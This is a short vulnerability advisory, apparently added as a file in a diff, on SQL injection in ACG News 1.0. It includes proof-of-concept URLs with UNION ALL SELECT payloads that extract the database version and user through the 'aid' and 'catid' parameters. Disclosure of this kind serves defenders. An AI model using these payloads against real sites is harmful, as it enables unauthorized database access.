@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/25466/info
+
+ACG News is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in SQL queries.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+These issues affect ACG News 1.0; other versions may also be vulnerable. 
+
+http://www.example.com/index.php?menu=showarticle&aid=[SQL INJECTION]
+http://www.example.com/index.php?menu=showarticle&aid=-3 UNION ALL SELECT 1,@@version,3,4,5,user(),7
+
+http://www.example.com/index.php?menu=showcat&catid=[SQL INJECTION]
+http://www.example.com/index.php?menu=showcat&catid=-3 UNION ALL SELECT 1,@@version 
